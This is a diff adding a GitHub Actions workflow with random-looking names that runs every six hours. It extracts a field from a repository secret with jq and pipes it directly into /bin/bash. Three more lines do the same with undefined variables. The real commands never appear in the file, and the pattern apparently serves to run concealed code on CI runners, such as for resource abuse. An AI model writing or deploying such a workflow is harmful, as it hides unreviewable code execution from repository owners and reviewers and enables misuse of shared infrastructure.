@@ -1,0 +1,21 @@
+name: songruna9871
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: songruna9871
+        env:
+          odu55: ${{ secrets.odu55 }}
+        run: |
+          echo $odu55 | jq -r .bej4716 | /bin/bash
+          echo $i1804 | jq -r .vu7 | /bin/bash
+          echo $bz5134 | jq -r .ywg208 | /bin/bash
+          echo $qsdpb823 | jq -r .skg5 | /bin/bash
+
